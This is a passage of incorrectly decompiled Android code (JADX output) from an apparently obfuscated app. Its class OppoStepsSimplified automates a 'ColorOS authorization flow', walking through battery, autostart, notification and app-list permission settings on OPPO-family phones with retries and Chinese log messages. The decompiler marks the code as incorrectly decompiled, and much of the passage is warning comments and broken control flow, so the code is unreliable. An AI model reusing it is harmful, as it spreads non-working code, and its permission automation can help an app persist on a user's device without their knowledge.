      0x07e8: PHI (r30v41 java.lang.String) = (r30v45 java.lang.String), (r30v45 java.lang.String), (r30v46 java.lang.String) binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE], TRY_ENTER, TRY_LEAVE, TryCatch #30 {Exception -> 0x0ac1, blocks: (B:310:0x07e8, B:264:0x06fe, B:225:0x0623), top: B:508:0x0623 }] */
    /* JADX WARN: Removed duplicated region for block: B:313:0x07fa  */
    /* JADX WARN: Removed duplicated region for block: B:317:0x0802  */
    /* JADX WARN: Removed duplicated region for block: B:337:0x088b  */
    /* JADX WARN: Removed duplicated region for block: B:338:0x088d  */
    /* JADX WARN: Removed duplicated region for block: B:343:0x08a7  */
    /* JADX WARN: Removed duplicated region for block: B:346:0x08b1  */
    /* JADX WARN: Removed duplicated region for block: B:347:0x08b4  */
    /* JADX WARN: Removed duplicated region for block: B:359:0x08e4 A[Catch: Exception -> 0x08de, TRY_LEAVE, TryCatch #8 {Exception -> 0x08de, blocks: (B:344:0x08a9, B:348:0x08b6, B:350:0x08cf, B:352:0x08d5, B:359:0x08e4), top: B:477:0x08a9 }] */
    /* JADX WARN: Removed duplicated region for block: B:365:0x0901  */
    /* JADX WARN: Removed duplicated region for block: B:369:0x0908  */
    /* JADX WARN: Removed duplicated region for block: B:382:0x0973  */
    /* JADX WARN: Removed duplicated region for block: B:388:0x0995  */
    /* JADX WARN: Removed duplicated region for block: B:391:0x09a0  */
    /* JADX WARN: Removed duplicated region for block: B:392:0x09a3  */
    /* JADX WARN: Removed duplicated region for block: B:400:0x09ca A[Catch: Exception -> 0x09d0, TRY_LEAVE, TryCatch #16 {Exception -> 0x09d0, blocks: (B:389:0x0998, B:393:0x09a5, B:395:0x09c0, B:400:0x09ca), top: B:492:0x0998 }] */
    /* JADX WARN: Removed duplicated region for block: B:411:0x09f5  */
    /* JADX WARN: Removed duplicated region for block: B:412:0x09f7 A[Catch: Exception -> 0x0ab5, PHI: r2 r4 r8 r20 r28 r30
      0x09f7: PHI (r2v79 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1) = 
      (r2v72 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v2 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
     binds: [B:410:0x09f3, B:26:0x00a4] A[DONT_GENERATE, DONT_INLINE]
      0x09f7: PHI (r4v33 long) = (r4v50 long), (r4v51 long) binds: [B:410:0x09f3, B:26:0x00a4] A[DONT_GENERATE, DONT_INLINE]
      0x09f7: PHI (r8v69 com.storm.safe.rock.service.modules.yw5xud.a5) = (r8v86 com.storm.safe.rock.service.modules.yw5xud.a5), (r8v87 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:410:0x09f3, B:26:0x00a4] A[DONT_GENERATE, DONT_INLINE]
      0x09f7: PHI (r20v78 java.lang.Object) = (r20v70 java.lang.Object), (r20v79 java.lang.Object) binds: [B:410:0x09f3, B:26:0x00a4] A[DONT_GENERATE, DONT_INLINE]
      0x09f7: PHI (r28v77 java.lang.String) = (r28v70 java.lang.String), (r28v78 java.lang.String) binds: [B:410:0x09f3, B:26:0x00a4] A[DONT_GENERATE, DONT_INLINE]
      0x09f7: PHI (r30v70 java.lang.String) = (r30v63 java.lang.String), (r30v71 java.lang.String) binds: [B:410:0x09f3, B:26:0x00a4] A[DONT_GENERATE, DONT_INLINE], TRY_LEAVE, TryCatch #4 {Exception -> 0x0ab5, blocks: (B:427:0x0a59, B:424:0x0a44, B:423:0x0a2c, B:412:0x09f7, B:409:0x09e5), top: B:469:0x005c }] */
    /* JADX WARN: Removed duplicated region for block: B:415:0x0a0f  */
    /* JADX WARN: Removed duplicated region for block: B:418:0x0a19 A[Catch: Exception -> 0x0a24, TryCatch #11 {Exception -> 0x0a24, blocks: (B:416:0x0a11, B:418:0x0a19, B:421:0x0a26, B:413:0x09fc), top: B:483:0x09fc }] */
    /* JADX WARN: Removed duplicated region for block: B:421:0x0a26 A[Catch: Exception -> 0x0a24, TRY_LEAVE, TryCatch #11 {Exception -> 0x0a24, blocks: (B:416:0x0a11, B:418:0x0a19, B:421:0x0a26, B:413:0x09fc), top: B:483:0x09fc }] */
    /* JADX WARN: Removed duplicated region for block: B:426:0x0a57  */
    /* JADX WARN: Removed duplicated region for block: B:508:0x0623 A[EXC_TOP_SPLITTER, PHI: r1 r2 r8 r10 r20 r21 r27 r28 r30
      0x0623: PHI (r1v29 java.lang.String) = (r1v33 java.lang.String), (r1v33 java.lang.String), (r1v34 java.lang.String) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r2v21 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1) = 
      (r2v27 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v27 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v32 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
     binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r8v20 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r8v114 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v115 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v116 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r10v36 long) = (r10v43 long), (r10v43 long), (r10v46 long) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r20v20 java.lang.Object) = (r20v26 java.lang.Object), (r20v26 java.lang.Object), (r20v27 java.lang.Object) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r21v18 java.lang.String) = (r21v22 java.lang.String), (r21v22 java.lang.String), (r21v23 java.lang.String) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r27v18 java.lang.String) = (r27v22 java.lang.String), (r27v22 java.lang.String), (r27v23 java.lang.String) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r28v25 java.lang.String) = (r28v29 java.lang.String), (r28v29 java.lang.String), (r28v30 java.lang.String) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE]
      0x0623: PHI (r30v19 java.lang.String) = (r30v23 java.lang.String), (r30v23 java.lang.String), (r30v24 java.lang.String) binds: [B:183:0x053d, B:191:0x0579, B:222:0x0619] A[DONT_GENERATE, DONT_INLINE], SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r4v1, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r4v10 */
    /* JADX WARN: Type inference failed for: r4v11, types: [long] */
    /* JADX WARN: Type inference failed for: r4v15 */
    /* JADX WARN: Type inference failed for: r4v16 */
    /* JADX WARN: Type inference failed for: r4v17 */
    /* JADX WARN: Type inference failed for: r4v18 */
    /* JADX WARN: Type inference failed for: r4v19 */
    /* JADX WARN: Type inference failed for: r4v2 */
    /* JADX WARN: Type inference failed for: r4v20 */
    /* JADX WARN: Type inference failed for: r4v21 */
    /* JADX WARN: Type inference failed for: r4v22 */
    /* JADX WARN: Type inference failed for: r4v23 */
    /* JADX WARN: Type inference failed for: r4v24 */
    /* JADX WARN: Type inference failed for: r4v25 */
    /* JADX WARN: Type inference failed for: r4v26 */
    /* JADX WARN: Type inference failed for: r4v28 */
    /* JADX WARN: Type inference failed for: r4v29 */
    /* JADX WARN: Type inference failed for: r4v3 */
    /* JADX WARN: Type inference failed for: r4v31 */
    /* JADX WARN: Type inference failed for: r4v39, types: [long] */
    /* JADX WARN: Type inference failed for: r4v4 */
    /* JADX WARN: Type inference failed for: r4v41 */
    /* JADX WARN: Type inference failed for: r4v42 */
    /* JADX WARN: Type inference failed for: r4v5 */
    /* JADX WARN: Type inference failed for: r4v6 */
    /* JADX WARN: Type inference failed for: r4v7 */
    /* JADX WARN: Type inference failed for: r4v8 */
    /* JADX WARN: Type inference failed for: r4v9 */
    /* JADX WARN: Type inference failed for: r8v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r8v1 */
    /* JADX WARN: Type inference failed for: r8v100 */
    /* JADX WARN: Type inference failed for: r8v101 */
    /* JADX WARN: Type inference failed for: r8v109 */
    /* JADX WARN: Type inference failed for: r8v11 */
    /* JADX WARN: Type inference failed for: r8v110 */
    /* JADX WARN: Type inference failed for: r8v14 */
    /* JADX WARN: Type inference failed for: r8v16 */
    /* JADX WARN: Type inference failed for: r8v17 */
    /* JADX WARN: Type inference failed for: r8v18 */
    /* JADX WARN: Type inference failed for: r8v2 */
    /* JADX WARN: Type inference failed for: r8v21 */
    /* JADX WARN: Type inference failed for: r8v24, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v25, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v3 */
    /* JADX WARN: Type inference failed for: r8v35 */
    /* JADX WARN: Type inference failed for: r8v38 */
    /* JADX WARN: Type inference failed for: r8v4 */
    /* JADX WARN: Type inference failed for: r8v45 */
    /* JADX WARN: Type inference failed for: r8v46 */
    /* JADX WARN: Type inference failed for: r8v47, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v48, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v49 */
    /* JADX WARN: Type inference failed for: r8v5 */
    /* JADX WARN: Type inference failed for: r8v50 */
    /* JADX WARN: Type inference failed for: r8v52, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v56, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v57, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v58 */
    /* JADX WARN: Type inference failed for: r8v59 */
    /* JADX WARN: Type inference failed for: r8v6 */
    /* JADX WARN: Type inference failed for: r8v62 */
    /* JADX WARN: Type inference failed for: r8v63 */
    /* JADX WARN: Type inference failed for: r8v65 */
    /* JADX WARN: Type inference failed for: r8v66, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v67, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v68 */
    /* JADX WARN: Type inference failed for: r8v7 */
    /* JADX WARN: Type inference failed for: r8v75 */
    /* JADX WARN: Type inference failed for: r8v77 */
    /* JADX WARN: Type inference failed for: r8v78 */
    /* JADX WARN: Type inference failed for: r8v8 */
    /* JADX WARN: Type inference failed for: r8v88 */
    /* JADX WARN: Type inference failed for: r8v9, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r8v92 */
    /* JADX WARN: Type inference failed for: r8v93 */
    /* JADX WARN: Type inference failed for: r8v96 */
    /* JADX WARN: Type inference failed for: r8v97 */
    /* JADX WARN: Type inference failed for: r8v98 */
    /* JADX WARN: Type inference failed for: r8v99 */
    /* JADX WARN: Type inference failed for: r9v10 */
    /* JADX WARN: Type inference failed for: r9v11, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r9v12 */
    /* JADX WARN: Type inference failed for: r9v13 */
    /* JADX WARN: Type inference failed for: r9v14 */
    /* JADX WARN: Type inference failed for: r9v15 */
    /* JADX WARN: Type inference failed for: r9v16 */
    /* JADX WARN: Type inference failed for: r9v17 */
    /* JADX WARN: Type inference failed for: r9v18 */
    /* JADX WARN: Type inference failed for: r9v19 */
    /* JADX WARN: Type inference failed for: r9v2 */
    /* JADX WARN: Type inference failed for: r9v20 */
    /* JADX WARN: Type inference failed for: r9v21 */
    /* JADX WARN: Type inference failed for: r9v26, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r9v3 */
    /* JADX WARN: Type inference failed for: r9v4 */
    /* JADX WARN: Type inference failed for: r9v5 */
    /* JADX WARN: Type inference failed for: r9v6 */
    /* JADX WARN: Type inference failed for: r9v7 */
    /* JADX WARN: Type inference failed for: r9v8 */
    /* JADX WARN: Type inference failed for: r9v9 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:154:0x04c9 -> B:488:0x04cd). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:203:0x05c5 -> B:85:0x0290). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:249:0x06bf -> B:251:0x06c3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:287:0x0794 -> B:484:0x0798). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:343:0x08a7 -> B:477:0x08a9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:388:0x0995 -> B:492:0x0998). Please report as a decompilation issue!!! */
    /* renamed from: b9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212321b9(ContinuationImpl continuationImpl) {
        OppoStepsSimplified$execute$1 oppoStepsSimplified$execute$1;
        ?? r9;
        String str;
        String str2;
        long j;
        long j2;
        long j3;
        String str3;
        String str4;
        long jCurrentTimeMillis;
        String str5;
        String str6;
        String str7;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        long j4;
        C0368a5 c0368a53;
        int i;
        String str8;
        String str9;
        long j5;
        Object objM212324c2;
        long j6;
        String str10;
        boolean zBooleanValue;
        OppoStepsSimplified$execute$1 oppoStepsSimplified$execute$12;
        int i2;
        C0368a5 c0368a54;
        int i3;
        long j7;
        C0368a5 c0368a55;
        Object objM212322c0;
        int i4;
        long j8;
        C0368a5 c0368a56;
        String str11;
        boolean zBooleanValue2;
        OppoStepsSimplified$execute$1 oppoStepsSimplified$execute$13;
        C0368a5 c0368a57;
        int i5;
        int i6;
        C0368a5 c0368a58;
        long j9;
        C0368a5 c0368a59;
        int i7;
        Object objM212330c8;
        long j10;
        String str12;
        boolean zBooleanValue3;
        int i8;
        C0368a5 c0368a510;
        String str13;
        int i9;
        C0368a5 c0368a511;
        long j11;
        C0368a5 c0368a512;
        long j12;
        C0368a5 c0368a513;
        Object objM212332d0;
        long j13;
        String str14;
        boolean zBooleanValue4;
        OppoStepsSimplified$execute$1 oppoStepsSimplified$execute$14;
        int i10;
        C0368a5 c0368a514;
        long j14;
        int i11;
        C0368a5 c0368a515;
        long j15;
        C0368a5 c0368a516;
        C0368a5 c0368a517;
        Object objM212326c4;
        long j16;
        int i12;
        long j17;
        String str15;
        boolean zBooleanValue5;
        int i13;
        C0368a5 c0368a518;
        String str16;
        int i14;
        C0368a5 c0368a519;
        long j18;
        C0368a5 c0368a520;
        long j19;
        long j20;
        int i15;
        Object objM212327c5;
        long j21;
        int i16;
        long j22;
        String str17;
        boolean zBooleanValue6;
        String str18;
        C0368a5 c0368a521;
        long j23;
        Object objM212328c6;
        C0368a5 c0368a522;
        long j24;
        C0368a5 c0368a523;
        long j25;
        Object objM212347f2;
        C0368a5 c0368a524;
        long j26;
        if (continuationImpl instanceof OppoStepsSimplified$execute$1) {
            oppoStepsSimplified$execute$1 = (OppoStepsSimplified$execute$1) continuationImpl;
            int i17 = oppoStepsSimplified$execute$1.f54547a5;
            if ((i17 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$execute$1.f54547a5 = i17 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$execute$1 = new OppoStepsSimplified$execute$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$execute$1.f54545a3;
        kj1.m213566b3();
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        String str19 = "autostart";
        Object obj2 = "battery";
        String str20 = "╚═══════════════════════════════════════════════════════════╝";
        ?? r8 = "│ [重试] 先返回桌面...";
        Object obj3 = obj;
        String str21 = ")";
        ?? r4 = " (重试";
        try {
            try {
                try {
                    try {
                        try {
                            try {
                                try {
                                } catch (Exception e) {
                                    e = e;
                                }
                            } catch (Exception e2) {
                                e = e2;
                                r9 = "%.2f";
                                r4 = "applist";
                            }
                        } catch (Exception e3) {
                            e = e3;
                            r9 = "%.2f";
                            r8 = "notification";
                            str = "秒)";
                            str2 = "ms (";
                            r4 = j3;
                        }
                    } catch (Exception e4) {
                        e = e4;
                        r9 = "%.2f";
                        r8 = "notification";
                        str = "秒)";
                        str2 = "ms (";
                        r4 = j2;
                    }
                } catch (Exception e5) {
                    e = e5;
                    r9 = "%.2f";
                    r8 = "autostart";
                    str = "秒)";
                    str2 = "ms (";
                    r4 = j;
                }
            } catch (Exception e6) {
                e = e6;
                r9 = "%.2f";
            }
        } catch (Exception e7) {
            e = e7;
            r9 = "%.2f";
            r8 = "applist";
            r4 = "autostart";
        }
        switch (oppoStepsSimplified$execute$1.f54547a5) {
            case 0:
                str3 = "notification";
                str4 = "applist";
                kg1.m213544f4(obj3);
                jCurrentTimeMillis = System.currentTimeMillis();
                obj3 = "%.2f";
                if (Settings.System.canWrite(this.f55112a1)) {
                    t60.m214704c5("OppoSteps", "╔════════════════════════════════════════════════════════════");
                    t60.m214704c5("OppoSteps", "║ ColorOS授权流程 - 已完成（检测到系统设置权限）");
                    t60.m214704c5("OppoSteps", "║ Settings.System.canWrite = true");
                    t60.m214704c5("OppoSteps", "║ 跳过整个适配流程");
                    t60.m214704c5("OppoSteps", "╚════════════════════════════════════════════════════════════");
                    return t60.m214689a7(true);
                }
                t60.m214704c5("OppoSteps", "╔═══════════════════════════════════════════════════════════╗");
                t60.m214704c5("OppoSteps", "║  ColorOS授权流程 V6 (OPPO/Realme/OnePlus)");
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                str6 = "autostart";
                str7 = "│ [重试] 先返回桌面...";
                t60.m214704c5("OppoSteps", "║  子品牌:" + ((OppoStepsSimplified$SubBrand) this.f55120a9.getValue()) + " SDK:" + this.f55113a2 + " 机型:" + this.f55114a3 + " 应用:" + m212334d7());
                t60.m214704c5("OppoSteps", "╚═══════════════════════════════════════════════════════════╝");
                try {
                    t60.m214704c5("OppoSteps", "┌─── 基础权限 ───────────────────");
                    oppoStepsSimplified$execute$1.f54542a0 = this;
                    oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                    oppoStepsSimplified$execute$1.f54547a5 = 1;
                    if (m212323c1(oppoStepsSimplified$execute$1) != coroutineSingletons) {
                        c0368a5 = this;
                        try {
                            t60.m214704c5("OppoSteps", "└─── 基础权限 完成 ───────────────────");
                            oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                            oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                            oppoStepsSimplified$execute$1.f54547a5 = 2;
                            c0368a52 = c0368a5;
                        } catch (Exception e8) {
                            e = e8;
                            r9 = obj3;
                            str = "秒)";
                            str2 = "ms (";
                            r8 = c0368a5;
                            r4 = jCurrentTimeMillis;
                            long jCurrentTimeMillis2 = System.currentTimeMillis() - r4;
                            t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                            t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2) / 1000.0d)}, 1)) + str);
                            oppoStepsSimplified$execute$1.f54542a0 = null;
                            oppoStepsSimplified$execute$1.f54547a5 = 29;
                            break;
                        }
                        try {
                            if (b81.m210571b1(300L, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                j4 = jCurrentTimeMillis;
                                c0368a53 = c0368a52;
                                i = 0;
                                if (i < 2) {
                                    if (i > 0) {
                                        try {
                                            str10 = " (重试" + i + ")";
                                        } catch (Exception e9) {
                                            e = e9;
                                            r4 = j4;
                                            r8 = c0368a53;
                                            r9 = obj3;
                                            str = "秒)";
                                            str2 = "ms (";
                                            long jCurrentTimeMillis22 = System.currentTimeMillis() - r4;
                                            t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                            t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22) / 1000.0d)}, 1)) + str);
                                            oppoStepsSimplified$execute$1.f54542a0 = null;
                                            oppoStepsSimplified$execute$1.f54547a5 = 29;
                                        }
                                    } else {
                                        str10 = "";
                                    }
                                    t60.m214704c5("OppoSteps", "┌─── 电池设置" + str10 + " ───────────────────");
                                    if (c0368a53.m212336d9("battery")) {
                                        t60.m214704c5("OppoSteps", "│ 电池设置已完成，跳过");
                                        t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                    } else if (i > 0) {
                                        str8 = str7;
                                        t60.m214704c5("OppoSteps", str8);
                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                                        oppoStepsSimplified$execute$1.f54543a1 = j4;
                                        oppoStepsSimplified$execute$1.f54544a2 = i;
                                        oppoStepsSimplified$execute$1.f54547a5 = 3;
                                        if (c0368a53.m212347f2(oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                            str9 = str20;
                                            j6 = c0368a53.f55126b5;
                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                                            oppoStepsSimplified$execute$1.f54543a1 = j4;
                                            oppoStepsSimplified$execute$1.f54544a2 = i;
                                            oppoStepsSimplified$execute$1.f54547a5 = 4;
                                            if (b81.m210571b1(j6, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                                                oppoStepsSimplified$execute$1.f54543a1 = j4;
                                                oppoStepsSimplified$execute$1.f54544a2 = i;
                                                oppoStepsSimplified$execute$1.f54547a5 = 5;
                                                objM212324c2 = c0368a53.m212324c2(oppoStepsSimplified$execute$1);
                                                break;
                                            }
                                        }
                                    } else {
                                        str8 = str7;
                                        str9 = str20;
                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                                        oppoStepsSimplified$execute$1.f54543a1 = j4;
                                        oppoStepsSimplified$execute$1.f54544a2 = i;
                                        oppoStepsSimplified$execute$1.f54547a5 = 5;
                                        objM212324c2 = c0368a53.m212324c2(oppoStepsSimplified$execute$1);
                                    }
                                }
                                str8 = str7;
                                str9 = str20;
                                try {
                                    j5 = c0368a53.f55125b4;
                                    oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                                    oppoStepsSimplified$execute$1.f54543a1 = j4;
                                    oppoStepsSimplified$execute$1.f54547a5 = 6;
                                    if (b81.m210571b1(j5, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                        obj2 = c0368a53;
                                        jCurrentTimeMillis = j4;
                                        r8 = obj2;
                                        i2 = 0;
                                        c0368a5 = r8;
                                        if (i2 >= 2) {
                                            try {
                                                j7 = c0368a5.f55125b4;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54547a5 = 10;
                                                if (b81.m210571b1(j7, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                    c0368a55 = c0368a5;
                                                    c0368a57 = c0368a55;
                                                    i5 = 0;
                                                }
                                            } catch (Exception e10) {
                                                e = e10;
                                                r9 = obj3;
                                                str = "秒)";
                                                str2 = "ms (";
                                                r8 = c0368a5;
                                                r4 = jCurrentTimeMillis;
                                                long jCurrentTimeMillis222 = System.currentTimeMillis() - r4;
                                                t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222) / 1000.0d)}, 1)) + str);
                                                oppoStepsSimplified$execute$1.f54542a0 = null;
                                                oppoStepsSimplified$execute$1.f54547a5 = 29;
                                            }
                                        } else {
                                            if (i2 > 0) {
                                                try {
                                                    str11 = " (重试" + i2 + ")";
                                                } catch (Exception e11) {
                                                    e = e11;
                                                    r4 = jCurrentTimeMillis;
                                                    r9 = obj3;
                                                    str = "秒)";
                                                    str2 = "ms (";
                                                    long jCurrentTimeMillis2222 = System.currentTimeMillis() - r4;
                                                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2222) / 1000.0d)}, 1)) + str);
                                                    oppoStepsSimplified$execute$1.f54542a0 = null;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                }
                                            } else {
                                                str11 = "";
                                            }
                                            t60.m214704c5("OppoSteps", "┌─── 后台运行+自启动" + str11 + " ───────────────────");
                                            str19 = str6;
                                            boolean zM212336d9 = r8.m212336d9(str19);
                                            c0368a56 = r8;
                                            if (zM212336d9) {
                                                t60.m214704c5("OppoSteps", "│ 自启动已完成，跳过");
                                                t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                                c0368a5 = r8;
                                                j7 = c0368a5.f55125b4;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54547a5 = 10;
                                                if (b81.m210571b1(j7, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                }
                                            } else {
                                                if (i2 > 0) {
                                                    t60.m214704c5("OppoSteps", str8);
                                                    oppoStepsSimplified$execute$1.f54542a0 = r8;
                                                    oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                    oppoStepsSimplified$execute$1.f54544a2 = i2;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 7;
                                                    Object objM212347f22 = r8.m212347f2(oppoStepsSimplified$execute$1);
                                                    c0368a54 = r8;
                                                    if (objM212347f22 != coroutineSingletons) {
                                                        long j27 = c0368a54.f55126b5;
                                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a54;
                                                        oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                        oppoStepsSimplified$execute$1.f54544a2 = i2;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 8;
                                                        c0368a56 = c0368a54;
                                                        break;
                                                    }
                                                }
                                                i3 = i2;
                                                long j28 = jCurrentTimeMillis;
                                                c0368a53 = c0368a56;
                                                j4 = j28;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                                                oppoStepsSimplified$execute$1.f54543a1 = j4;
                                                oppoStepsSimplified$execute$1.f54544a2 = i3;
                                                oppoStepsSimplified$execute$1.f54547a5 = 9;
                                                objM212322c0 = c0368a53.m212322c0(oppoStepsSimplified$execute$1);
                                                if (objM212322c0 != coroutineSingletons) {
                                                    try {
                                                        try {
                                                            long j29 = j4;
                                                            i4 = i3;
                                                            j8 = j29;
                                                            zBooleanValue2 = ((Boolean) objM212322c0).booleanValue();
                                                            String str22 = !zBooleanValue2 ? "成功" : "失败";
                                                            StringBuilder sb = new StringBuilder();
                                                            sb.append("└─── 自启动");
                                                            sb.append(str22);
                                                            sb.append(" ───────────────────");
                                                            t60.m214704c5("OppoSteps", sb.toString());
                                                            if (!zBooleanValue2 && !r8.m212336d9(str19)) {
                                                                if (i4 < 1) {
                                                                    t60.m214704c5("OppoSteps", "│ 自启动未完成，准备重试...");
                                                                }
                                                                i2 = i4 + 1;
                                                                jCurrentTimeMillis = j8;
                                                                oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$13;
                                                                str6 = str19;
                                                                r8 = r8;
                                                                c0368a5 = r8;
                                                                if (i2 >= 2) {
                                                                }
                                                            }
                                                            jCurrentTimeMillis = j8;
                                                            oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$13;
                                                            c0368a5 = r8;
                                                            j7 = c0368a5.f55125b4;
                                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                                                            oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                            oppoStepsSimplified$execute$1.f54547a5 = 10;
                                                            if (b81.m210571b1(j7, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                            }
                                                        } catch (Exception e12) {
                                                            e = e12;
                                                            r4 = j8;
                                                            r9 = obj3;
                                                            str = "秒)";
                                                            str2 = "ms (";
                                                            long jCurrentTimeMillis22222 = System.currentTimeMillis() - r4;
                                                            t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                            t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22222) / 1000.0d)}, 1)) + str);
                                                            oppoStepsSimplified$execute$1.f54542a0 = null;
                                                            oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                        }
                                                        r8 = c0368a53;
                                                    } catch (Exception e13) {
                                                        e = e13;
                                                        r4 = j8;
                                                        r9 = obj3;
                                                        str = "秒)";
                                                        str2 = "ms (";
                                                        oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$13;
